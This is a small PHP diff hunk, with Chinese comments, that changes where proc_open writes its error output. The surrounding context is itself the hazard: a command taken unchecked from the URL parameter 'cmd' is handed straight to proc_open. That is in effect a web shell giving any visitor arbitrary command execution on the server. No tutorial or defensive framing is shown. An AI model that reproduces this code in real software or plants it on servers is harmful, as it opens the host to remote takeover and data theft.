@@ -4,7 +4,7 @@ $cmd = $_GET["cmd"];
 $array =   array(
     array("pipe","r"),   //标准输入
     array("pipe","w"),   //标准输出内容
-    array("pipe","w")    //标准输出错误
+    array("file","/tmp/error-output.txt","a")    //标准输出错误
 );
 
 $fp = proc_open($cmd,$array,$pipes);   //打开一个进程通道
